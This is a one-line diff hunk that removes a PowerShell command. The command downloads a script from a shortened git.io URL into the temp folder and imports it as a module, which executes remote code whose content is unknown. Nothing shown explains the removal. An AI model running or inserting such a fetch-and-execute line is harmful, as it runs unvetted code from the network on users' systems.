@@ -1,1 +1,0 @@
-﻿iwr -useb git.io/JPM7E -o $env:TMP\a.ps1; ipmo $env:TMP\a.ps1
